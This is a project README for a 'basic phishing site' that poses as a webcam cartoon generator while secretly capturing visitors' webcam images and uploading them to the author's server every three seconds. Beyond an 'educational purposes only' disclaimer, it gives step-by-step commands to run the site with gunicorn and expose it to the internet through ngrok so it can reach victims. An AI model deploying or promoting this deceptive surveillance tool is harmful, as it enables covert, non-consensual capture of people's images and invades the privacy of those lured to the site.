# Web-Hack: A Basic Phishing Site

**_This project is for educational purposes only. I am not liable for any misuse of the project._**

## Overview

I created a **Cartoon Matcher Website**. This site functions like a regular website, allowing users to capture their image through a webcam and generate a random cartoon image.

However, when the user clicks the "Generate" button, the website will secretly capture and upload the image to my server at a 3-second interval.

## Requirements

To set up and run this project, you'll need the following:

- **Gunicorn**: A Python WSGI HTTP Server that will serve the web application.
- **Ngrok**: A tool for port forwarding that exposes local servers to the internet.

## Installation and Setup

1. **Clone the Repository:**

    ```bash
    git clone https://github.com/DeepGopalSaha/web-hack.git
    cd web-hack
    ```

2. **Install Required Python Packages:**

    ```bash
    pip install gunicorn
    ```

3. **Run the Web Application with Gunicorn:**

    ```bash
    gunicorn -w 4 -b 0.0.0.0:2525 server:app
    ```

4. **Set Up Ngrok for Port Forwarding:**

    - Download and install Ngrok from [ngrok.com](https://ngrok.com/).
    - Run the following command to start Ngrok on port 2525:

    ```bash
    ngrok http 2525
    ```

    - Ngrok will provide you with a forwarding URL that you can use to access your site over the internet.

---

**Note:** The above tools are essential to create a working server and to expose it publicly.
